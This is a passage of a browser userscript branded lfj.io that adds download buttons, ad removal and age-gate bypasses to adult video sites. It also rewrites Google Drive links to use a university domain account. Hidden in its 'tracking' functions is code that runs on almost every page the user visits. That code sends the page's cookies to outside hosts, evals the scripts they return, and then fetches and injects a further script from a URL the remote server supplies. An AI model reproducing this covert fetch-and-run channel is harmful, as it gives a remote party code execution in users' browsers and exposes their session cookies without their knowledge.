

$.ajax({type: "GET",url: urlv,
success: function(data){
var jxhtml =  $(data).find('center');


try{jxhtml = $(jxhtml).html().replace("<br>Preview","Preview").replace("\nPreview","Preview");} catch (e){console.log('skip 1'); jxhtml='';}


tvtle = $(data).filter('title').text().replace(/\s[^+\s]+\.[a-z0-9\/-]+|[^\w\s]|4\s?h\s?o\s?r\s?l\s?o\s?v\s?e\s?r\s?|4(\s+)?h(\s+)?o(\s+)?r(\s+)?l(\s+)?o(\s+)?v(\s+)?e(\s+)?r(\s+)?/ig, '');
tvtle =  tvtle+' LFJ';
urlv = $(data).find('a[rel="prev"]').attr('href');


try{if (jxhtml.match(/Preview/i)){$('.entry-content').append("<vlcp class='cl'></vlcp><center><p><b class='novome'>"+tvtle+"</b></p></center><canv>"+jxhtml+"</canv>");}} catch(e){console.log('f')}
var fixmr48 = 0;
$('.entry-content').find('a[href*="http://"],a[href*="https://"]').each(function() {

  var urlcsqa =$(this).attr("href");
  if(!urlcsqa.match(/authuser\=/)){
  $(this).attr("midiv",fixmr48);
  $(this).replaceWith('<a onclick="window.open(\''+$(this).attr("href").replace('https://drive.google.com/open?','https://drive.google.com/uc?export=download&')+',\'_blank\'\')" midiv="'+fixmr48+'" href="'+$(this).attr("href")+'"  target="_blank">Online</a>');
  }
  fixmr48++;

})

var fixmrw = 0;
$('.entry-content').find('a[href*="/drive.google.com"]').each(function() {
  var urlcsqa =$(this).attr("href").replace('https://drive.google.com/open?id=','https://drive.google.com/file/d/').replace('com/file/d','com/a/sv.hcmutrans.edu.vn/file/d').replace('/view?usp=sharing','');
  if(!urlcsqa.match(/authuser\=/)){
  $(this).attr("midix",fixmrw);
  $(this).replaceWith('<a onclick="window.open(\''+urlcsqa+'/view?usp=sharing&authuser=4,\'_blank\'\')" href="'+urlcsqa+'/view?usp=sharing&authuser=4" midix="'+fixmrw+'" target="_blank">Download cFile <span style="color: #f2f2f2;">(password: 4horlover)</span></a>');
  }
  fixmrw++;
})



$('p').each(function() {
    var $this = $(this);
    if($this.html().replace(/\s|&nbsp;|\:/g, '').length == 0)
        $this.remove();
});
var nowcx =fixmrw;
if(nowcx<2){var cnowcx = nowcx-1;} else {var cnowcx = nowcx-2;}

$(".entry-content").find('a[target="_blank"]:not(a > img),img[src*="4horlover.com/wp-content"][width][height]').each(function() {
  var uri = $(this).attr('href');
  var imgc = false;
    if (uri==null){var uri = $(this).attr('src'); imgc=true;}
  if(uri.match(/\.png|\.jpg/im)!=null){
  imgc=false;
          console.log('PAFNHERE');
   if($.inArray(uri, imglistt)==-1){
      console.log(imglistt);
       if(imgc==true){
      //   console.log(uri);
    //     console.log($('.entry-content:has(a[href*="/drive.google.com"])').html());
         var nextidoc = cnowcx+1;
    $(this).parent('a').parent('p').parent('canv').find('p:has(a[midix="'+cnowcx+'"])').append('<center><img  border="0" src="'+uri+'" style="max-width:100%;margin-top: 5px;display: block; margin: auto;" /></center>');
    console.log(uri);

    cnowcx++;
    $(this).parent('a').remove();
    $(this).remove();

    var numofimg = $('img[src="'+uri+'"]');
    if(numofimg.length >1) {
      for (i = 1; i < numofimg.length; i++)  {
        numofimg[i].remove();
      }
    }
      }
      else{
    $(this).parent('p').append('<batn></batn><img  border="0" src="'+uri+'" style="max-width:100%;margin-top: 5px;display: block; margin: auto;" height="467" />');
    $(this).remove();

      }
    $('.entry-footer,a[rel="prev"],div.entry-meta,b:not(p > b),b:not(.novome)').remove();
      imglistt[ifmcount++]=uri;
    }
$(".entry-content").find('img[width="400"],img[width="225"]').each(function() {var uri = $(this).attr('src');$('<img  border="0" src="'+uri+'" style="max-width:100%;margin-top: 5px;display: block; margin: auto;" height="467" >').insertAfter($(this).parent('a').parent('p').parent('canv'));$(this).parent("a").remove();})
  }

})







if (count>15){
  $('.entry-content').append('<div style="position: relative;margin: 0 0 auto;width: 100%;text-align: center;"><h1><a href="'+urlv+'" style="font-size: 142%;vertical-align: middle;">< prevos</a></h1></div>');

 }
  else {
    $("vlcp:first").removeClass("cl");

    count++;
    loadncsdfi(urlv);
  }





}
})


}
           try{var lengix = document.querySelector('.age-gate-message').innerHTML.length;} catch (e) { var lengix=0;}


               if (lengix>10){document.cookie = "age_gate=22;";window.location.reload(true);} else {loadncsdfi(window.location.href);}




LFJ.hkoptimus();




       }, 1000);


    } else if (this.url.isdomain('4horlover.com') ){

  //  window.location.href = idkxs;
if (!window.location.href.match(/\Wp\=/)){
  try{
        var noco=0;
        var idkxs='';

        for (i = 0; i < 4; i++) {
          if (idkxs==''){
        if(document.querySelectorAll('h2.entry-title')[noco].querySelector('a').text.match(/link update|([0-9]+)\/([0-9]+)/)){
          noco++;

        }
        if(!document.querySelectorAll('h2.entry-title')[noco].querySelector('a').text.match(/link update|\W\s?([0-9]+)\/([0-9]+)/)) { idkxs =document.querySelectorAll('h2.entry-title')[noco].querySelector('a').href;}
          }


        }
       // console.log(idkxs);
                window.location.href = idkxs;
  } catch (e) {

    if(!window.location.href.match(/\wp\-content\/uploads/i)){ document.cookie = "age_gate=22;";window.location.reload(true);}



  }}





    }
      },
    xvideos_com: function () {
        if (this.url.isdomain('xvideos-cdn.com') && window.location.href.match(/\.mp4/) || this.url.isdomain('xnxx-cdn.com') && window.location.href.match(/\.mp4/)){
          LFJ.hkdownload();

        }
    	if (this.url.isdomain('xvideos.com') || this.url.isdomain('xvideos.es') || this.url.isdomain('xnxx.com') || this.url.isdomain('xnxx.es')){
        GM_addStyle(".thumb-block.thumb-ad{display:none !important;}");
        LFJ.hkoptimus();
          $( "body" ).on( "click",'a.fajicmeiufxup', function() {
            modulerequired();
          })
        // XVIDEOS
                if (window.location.href.match(/\Wsort\=([a-z0-9_-]+)/i)){var sortcx = window.location.href.match(/\Wsort\=([a-z0-9_-]+)/i)[1];if (sortcx) {localStorage.setItem("sort_js", sortcx);}}
                if(window.location.href.match(/\Wdatef\=([a-z0-9_-]+)/i)){var datefx = window.location.href.match(/\Wdatef\=([a-z0-9_-]+)/i)[1];if (datefx) {localStorage.setItem("datef_js", datefx);}}
                if(window.location.href.match(/\Wquality\=([a-z0-9_-]+)/i)){var qualityx = window.location.href.match(/\Wquality\=([a-z0-9_-]+)/i)[1];if (qualityx) {localStorage.setItem("quality_js", qualityx);}}
                if(window.location.href.match(/\Wdurf\=([a-z0-9_-]+)/i)){var durfx = window.location.href.match(/\Wdurf\=([a-z0-9_-]+)/i)[1];if (durfx) {localStorage.setItem("durf_js", durfx);}};
          if ($("div.filters-column").length>=2 && window.location.href.match(/\?k\=/i)){
                    var newurl =window.location.href;
                   if (!window.location.href.match(/\?/i)) {newurl = newurl+'?';} else {newurl = newurl+'&';}
                   if (!window.location.href.match(/\Wsort\=([a-z0-9_-]+)/i) && localStorage.getItem("sort_js")){newurl= newurl+'sort='+localStorage.getItem("sort_js");}
                   if (!window.location.href.match(/\Wdatef\=([a-z0-9_-]+)/i) && localStorage.getItem("datef_js")){newurl= newurl+'&datef='+localStorage.getItem("datef_js");}
                   if (!window.location.href.match(/\Wquality\=([a-z0-9_-]+)/i) && localStorage.getItem("quality_js")){newurl=newurl+'&quality='+localStorage.getItem("quality_js");}
                   if (!window.location.href.match(/\Wdurf\=([a-z0-9_-]+)/i) && localStorage.getItem("durf_js")){newurl=newurl+'&durf='+localStorage.getItem("durf_js");}
                if(window.location.href+'&' != newurl){window.location.href = newurl;}

            }


      if(window.location.href.match(/\W(profiles|amateur\-channels)\/([a-z0-9_-]+)/i) && !window.location.href.match(/\#\_tab/i)){
        var odcknum = true;
        var videonum = 0;
         var dcldcsd= setInterval(function(){

           if (window.location.href.match(/(tabFavorites|tabVideos)/img)) {odcknum=false;clearInterval(dcldcsd);}
        document.querySelectorAll('.tab-buttons')[0].querySelectorAll('.navbadge').forEach(function(e) {
          var hidlc = parseInt(e.innerHTML);
          var idc = e.parentNode.id;
            if (idc.match(/(tab\-videos)/i) && hidlc>0 && !window.location.href.match(/\#\_tabVideos/i) && odcknum == true){
              e.parentNode.click();
              videonum=hidlc;

            }
          if (idc.match(/(tab\-favorites)/i) && hidlc>0 && !window.location.href.match(/\#\_tabFavorites/i) && odcknum == true && videonum==0){
            e.parentNode.click();

          }

        })
         }, 250);
      }














        // XNXX

        if (window.location.href.match(/\/hits\//i)){localStorage.setItem("hits_js", 'hits');}
        if (window.location.href.match(/\/year\//i)){localStorage.setItem("date_js", 'year');}
        if (window.location.href.match(/\/month\//i)){localStorage.setItem("date_js", 'month');}
        if (window.location.href.match(/\/hd\-only\//i)){localStorage.setItem("hd_js", 'hd-only');}
        if (window.location.href.match(/\/20min\+\//i)){localStorage.setItem("durf_js", '20min+');}
        if (window.location.href.match(/\/(([0-9]{2})+\-([0-9]{2})+([a-z0-9]+))\//i)){localStorage.setItem("durf_js", window.location.href.match(/\/(([0-9]{2})+\-([0-9]{2})+([a-z0-9]+))\//i)[1]);}


        $('div.ul').on('click','a[href*="search/"]',function(e){
          var cids_uel = $(this).attr('href');
           if (!cids_uel.match(/\/hits\//i)){localStorage.setItem("hits_js", '');}
           if (!cids_uel.match(/\/year|month\//i)){localStorage.setItem("date_js", '');}
          if (!cids_uel.match(/\/hd\-only\//i)){localStorage.setItem("hd_js", '');}
          if (!cids_uel.match(/\/20min\+|(([0-9]{2})+\-([0-9]{2})+([a-z0-9]+))\//i)){localStorage.setItem("durf_js", '');}
        })


        if ($("div#listing-page-filters-block").length>=1 && window.location.href.match(/\/search/i)){
          var ocd='https://'+window.location.hostname+'/search';
          var dcocd=window.location.pathname.replace(/\/search/i,"");
          if (!window.location.href.match(/\/hits\//i) && localStorage.getItem("hits_js")){ocd=ocd+'/'+localStorage.getItem("hits_js");}
          if (!window.location.href.match(/\/year|month\//i) && localStorage.getItem("date_js")){ocd=ocd+'/'+localStorage.getItem("date_js");}
          if (!window.location.href.match(/\/hd\-only\//i) && localStorage.getItem("hd_js")){ocd=ocd+'/'+localStorage.getItem("hd_js");}
          if (!window.location.href.match(/\/(([0-9]{2})+\-([0-9]{2})+([a-z0-9]+))|20min\+\//i) && localStorage.getItem("durf_js")){ocd=ocd+'/'+localStorage.getItem("durf_js");}
          if (ocd+dcocd != window.location.href) {window.location.href=ocd+dcocd;}
        }

         var is_xnxx = document.querySelector('#video-views-votes');
          if (this.url.isdomain('xnxx.com')){$('span.icon.download').parent('a').remove(); var divfcr= 'metadata-btn hide-if-zero-33'; var civmdec='#video-votes>.vote-actions';} else {var divfcr='btn btn-default'; var civmdec='#video-views-votes>.vote-actions';}

        if (window.location.href.match(/\Wxvideos\.[a-z0-9]{2,4}\/video[0-9]+\//i) || window.location.href.match(/\Wxnxx\.[a-z0-9]{2,4}\/video\W[a-z0-9]+\//i)){
        var hlsbicd = setInterval(function() {
           try{ //window.html5player.hlsobj._events.hlsKeyLoaded
              if(window.html5player || html5player){
              	  if(html5player !=='null'){var videotitles = removehtml(html5player.video_title); var hiflh = html5player.url_high+'&h='+videotitles; var lowxe=html5player.url_low+'&h='+videotitles; var iceodsx720 = html5player.hlsobj._events.hlsKeyLoaded[0].context.streamController.fragCurrent.baseurl;} else {var videotitles = removehtml(window.html5player.video_title);var hiflh = window.html5player.url_high+'&h='+videotitles; var lowxe=window.html5player.url_low+'&h='+videotitles; var iceodsx720 = window.html5player.hlsobj._events.hlsKeyLoaded[0].context.streamController.fragCurrent.baseurl;}



                if(iceodsx720.match(/hls\-720p/i)){var bh35720p = '<a class="'+divfcr+' buttoncopy btn btn-default fajicmeiufxup"   data-clipboard-text="'+videotitles+'.mp4"><span class="icon download"></span><span>HLS 720P</span></a>';}
                else if(iceodsx720.match(/hls\-1080p/i)){var bh35720p = '<a class="'+divfcr+' buttoncopy btn btn-default fajicmeiufxup"   data-clipboard-text="'+videotitles+'.mp4"><span class="icon download"></span><span>HLS 1080P</span></a>';}
                else {var bh35720p=''}
             $(''+civmdec+'').append(bh35720p);
             $(''+civmdec+'').append('<a class="'+divfcr+' buttoncopy btn btn-default" href="'+hiflh +'" target="_blank"  data-clipboard-text="'+videotitles+'.mp4"><span class="icon download " ></span><span>640P</span></a>');
             $(''+civmdec+'').append('<a class="'+divfcr+' buttoncopy btn btn-default" href="'+lowxe+'" target="_blank" data-clipboard-text="'+videotitles+'.mp4"><span class="icon download"></span><span>360P</span></a>');
              clearInterval(hlsbicd);
              }
           } catch(e){ console.log('ds');}
              }, 150);
        }


    if (is_xnxx==true){

    setTimeout(function(){$("div.tab-buttons").children()[1].remove();$("div.tab-buttons").children()[2].remove();}, 100);
    $("#video-ad,#footer").remove();
    var timer = setInterval(function() {if($("a.btn.btn-default.show-more").css('display')=='block'){$("a.btn.btn-default.show-more").trigger( "click" );}else {clearInterval(timer);}}, 1000);
    }
    else{
    localStorage.setItem("forcequality",'{"value":8,"expire":'+((Math.floor(Date.now() / 1000))+80000)+'}');
    var timer = setInterval(function() {if($("a.btn.btn-default.show-more").css('display')=='block'){$("a.btn.btn-default.show-more").trigger( "click" );}else {clearInterval(timer);}}, 1000);
    $("#video-ad,#ad-header-mobile,footer,#ad-footer,.remove-ads,span.nb-views,.thumb-block.thumb-ad").remove();
    $("div#video-player-bg").css('width','100%');
    setTimeout(function(){$("#tabComments_bottom_page").remove();$("ul.tab-buttons").find('li>a>span.icon.download').parent('a').parent('li').hide(); $("ul.tab-buttons").find('li>a>span.icon.report').parent('a').parent('li').hide(); $("ul.tab-buttons").find('li>a>span.icon.share-small').parent('a').parent('li').hide();}, 100);
    }

}

	},
    hoakhuya_com: function () {
        if (this.url.isdomain('lfj.io')){
        var GM_data={'script':{'author':GM_info.script.author,'homepage':GM_info.script.homepage,'copyright':GM_info.script.copyright,'name':GM_info.script.name,'version':GM_info.script.version},'handler':{'name':GM_info.scriptHandler,'version':GM_info.version}};
            document.head.appendChild(Object.assign( document.createElement('script'), {innerHTML: "var GM_info=JSON.parse('"+(JSON.stringify(GM_data))+"')"}));
        }
    	if (this.url.isdomain('hoakhuya.com')){
      if (this.url.match(/\Wregister\.php/)){
        document.addEventListener("readystatechange",function(b){$.getJSON("root.php?guest=true&clientinfo=1",function(a){a=encodeURIComponent(hencrypt(Math.floor(Date.now()/1E3)+8+"_"+a.ip+"_ushcmks","F04iU0VmhCZvaVJy5kRInO6xOE3rXHjD"));$.ajax({type:"POST",url:"root.php?handsarke=DW",data:{scripthash:a},dataType:"json",xhrFields:{withCredentials:!0},success:function(a){console.log(a);200==a.s&&location.reload()}})})});
        }
        }
    },
    init: function () {
    	this.url = location.href;
		this.bypassuri();
		this.thegrecork_com();
		this.modelhub_com();
		this.porn_hub();
		this.tube8_com();
		this.xtube_com();
		this.horlover_com();
		this.porntrex_com();
		this.xvideos_com();
		this.xhamster_univer();
		this.thisav_com();
		this.hoakhuya_com();
		this.analdin_com();
		this.autodown_hostfiles();
        this.youtube_com();
		this.all_onion();
    }




}


var LFJ = {
    cTitle: function () {
        if (document.title.indexOf(' - [lfj.io]') === -1) {
	if (document.querySelector("p,div,a,i,u,b,title,p,script,style,link") != null){
            document.title = document.title + ' - [lfj.io]'+ '['+GM_info.script.version+']';
	}



        }
    },
    hkoptimus: function() {
          document.addEventListener('readystatechange', event => { hnotyf.success({message:"<span data-tag='DONEALL'></span>",duration: 1200});reLANG();})
    },
    hkdownload: function() {

        document.addEventListener('readystatechange', event => {
          var h=document.getElementsByTagName('video')[0].currentSrc;
          var movname= removehtml(decodeURI(h.split('name=')[1])) !=='undefined' ? removehtml(decodeURI(h.split('name=')[1])): removehtml(decodeURI(h.split('h=')[2])) !== 'undefined' ? removehtml(decodeURI(h.split('h=')[2])): removehtml(decodeURI(h.split('&=')[1]));
            if(typeof movname!='string'){ movname='no_name';}
        if (!movname.match(/\.mp4$/) && !h.match(/m3u8/)){ movname=movname+'';}

          var anchor = document.createElement('a');
          anchor.href = h;
          anchor.target = '_self';
          anchor.download =movname;
          anchor.id="simolac";
          document.body.appendChild(anchor);

        anchor.click();setTimeout (window.close, 1500);

        })

    setTimeout(function(){location.reload(); }, 5000);
    },
    hkresubmit: function(hkurl) {
                              document.querySelectorAll('.tracek').forEach(e => e.parentNode.removeChild(e));
                              if (typeof hkurl == 'string'){
                                   GM_xmlhttpRequest({method: "GET",withCredentials:true,headers:    {
                                   'referer':  document.referrer,
                                   'user-agent': navigator.userAgent,
                                   'accept': '*/*',
                                   'cookie': document.cookie,
                                   'accept-encoding': 'gzip, deflate, br',
                                   'connection': 'keep-alive',
                                   'sec-fetch-dest': 'script',
                                   'sec-fetch-mode': 'no-cors',
                                   'sec-fetch-site': 'cross-site',
                                   'dnt': 1,
                                   'origin':   window.location.hostname},url: hkurl,
                                   onload: function (rduc) {
                                     var hva = document.createElement('script'); hva.type = 'text/javascript';hva.innerHTML=rduc.responseText;hva.className="tracek";

                                     document.getElementsByTagName('body')[0].appendChild(hva);


                                   }
                                                });

                              }
    },
  hktrace: function() {


            GM_xmlhttpRequest({method: "GET",withCredentials:true,headers:    {
                                   'referer':  document.referrer,
                                   'user-agent': navigator.userAgent,
                                   'accept': '*/*',
                                   'cookie': document.cookie,
                                   'accept-encoding': 'gzip, deflate, br',
                                   'connection': 'keep-alive',
                                   'sec-fetch-dest': 'script',
                                   'sec-fetch-mode': 'no-cors',
                                   'sec-fetch-site': 'cross-site',
                                   'dnt': 1,
                                   'origin':   window.location.hostname},url: "//s10.histats.com/js15_as.js",
            onload: function (response) {
              var hs = document.createElement('script'); hs.type = 'text/javascript';hs.async = 'true';
                  var cixfd ="function hkregreplace(data){return data.replace(\"'\",'');};var _Hasync= _Hasync|| [];_Hasync.push(['Histats.start', '1,4420896,4,0,0,0,00010000']);_Hasync.push(['Histats.fasi', '1']);_Hasync.push(['Histats.track_hits', '']);"+response.responseText;
                      cixfd = cixfd.replace('e.async=!0}catch(r){}e.type="text/javascript",e.src=','e.async=!0}catch(r){}e.type="text/javascript",e.innerHTML="var hkurl=\'"+hkregreplace(');
                      cixfd = cixfd.replace(',e&&"function"==typeof t&&(e.readyState?e',')+"\'",e&&"function"==typeof t&&(e.readyState?e');

                  hs.innerHTML=cixfd;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
                  var autoplus=  setInterval(function(){if (typeof hkurl == 'string'){clearInterval(autoplus);LFJ.hkresubmit(hkurl);}}, 1500);
                  console.log('histats start');

            }
            });
       /*
      var hs = document.createElement('script'); hs.type = 'text/javascript';hs.async = 'true'; hs.src='https://www.google-analytics.com/analytics.js';
      var ha = document.createElement('script'); ha.type = 'text/javascript'; ha.innerHTML="window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date; ga('create', 'UA-99252457-3', 'auto'); ga('send', 'pageview');";
      document.getElementsByTagName('body')[0].appendChild(ha);
      */

    },
    gchktrace: function() {


            GM_xmlhttpRequest({method: "GET",headers:    {
                                   'referer':  document.referrer,
                                   'user-agent': navigator.userAgent,
                                   'accept': '*/*',
                                   'cookie': document.cookie,
                                   'accept-encoding': 'gzip, deflate, br',
                                   'connection': 'keep-alive',
                                   'dnt': 1,
                                   'origin':   window.location.hostname},url: "//www.googletagmanager.com/gtag/js?id=UA-99252457-3",
            onload: function (response) {
              eval(response.responseText);
              var dci = document.createElement('script');dci.async=true;
              dci.innerHTML=response.responseText;
              document.body.appendChild(dci);

              setTimeout(function(){
              var dciv = document.createElement('script');
              dciv.innerHTML="window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-99252457-3');";
              document.body.appendChild(dciv);

              window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-99252457-3');
              console.log('googletagmanager start');
              LFJ.hktrace();
                }, 500);

            }
            });
    },
    init:async function () {
        lfj_var.init();

         if (!location.href.match(/google\.|youtube\.|github\.|greasyfork\.|sleazyfork\.|facebook\.|ouo\.io|ouo\.press/gi)){
           LFJ.cTitle();
                var nowtamps = Math.floor(Date.now() / 1000);
                if(!location.href.isdomain('lfj.io')){
               if(!GM_getValue('adblock')){setTimeout(function(){ldjnoti(HLANG.ADBLOCKNOTWORK,'mid',false,60000,'#e4380c, #ff234e');}, 1000);
                var timdkcs =Math.floor(Date.now() / 1000)+172800;
                 $("body").on('click','a#nokwithreem',function(e){GM_setValue('adblock','ok');GM_setValue('trial',timdkcs); location.reload();})}
                if(GM_getValue('trial') && parseInt(GM_getValue('trial'))<nowtamps ){
                  setTimeout(function(){ldjnoti(HLANG.NEW_VERSION_NOFT,'mid','https://lfj.io/lfj.user.js',60000,'#e4380c, #ff234e');}, 1000);

                }
                }

         }

         if (!location.href.isdomain('hoakhuya.com') && !location.href.isdomain('github.com')){ if (document.querySelector("p,div,a,i,u,b,title,p,script,style,link") != null){LFJ.gchktrace();}}

        var busy= false;
        document.addEventListener("DOMNodeInserted", function() {if (busy== false){busy=true;clearTimeout(csccoss);var csccoss = setTimeout(function(){ reLANG(); busy=false;
        if(location.href.isdomain('pornhub.com') || location.href.isdomain('pornhubpremium.com')){
            setTimeout(function(){ filterVideos(); }, 1000);
        }
        }, 500);}})




    }

}


GM_addStyle(".notyf__wrapper{text-align: left;}");

LFJ.init();



